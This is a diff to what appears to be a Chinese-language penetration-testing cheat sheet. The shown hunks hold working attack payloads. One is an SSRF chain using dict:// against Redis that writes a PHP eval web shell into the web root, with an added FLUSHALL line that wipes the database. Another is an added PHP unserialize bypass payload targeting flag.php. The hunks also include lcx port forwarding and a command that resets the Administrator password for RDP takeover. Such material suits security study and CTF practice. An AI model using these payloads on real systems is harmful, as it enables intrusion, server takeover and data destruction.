@@ -342,6 +342,7 @@ http://10.10.10.10:443
 
 ```
 dict://127.0.0.1:3306
+dict://127.0.0.1:6379/FLUSHALL
 dict://127.0.0.1:6379/CONFIG SET dir /var/www/html
 dict://127.0.0.1:6379/CONFIG SET dbfilename file.php
 dict://127.0.0.1:6379/SET x "<\x3Fphp eval($_GET[0])\x3F>"
@@ -629,6 +630,12 @@ O:7:"Example":4:{s:5:"v_int";i:12;s:8:"v_string";s:5:"abcde";s:7:"v_float";d:3.1
 s:7:"3334444";a:1:{s:4:"key1";s:6:"value1";}
 ```
 
+特殊绕过方式（数字前加`+`号，对象长度加1）
+
+```
+O:+4:"Demo":2:{s:4:"file";s:8:"flag.php";}
+```
+
 ### 示例
 
 常见 PHP magic method
@@ -788,7 +795,7 @@ lcx.exe -slave 10.26.14.222 22333 127.0.0.1 3389
 - 修改管理员密码
 
 ```cmd
-net user Administrator 1@qW
+net user Administrator qW1@
 ```
 
 - 连接RDP即可
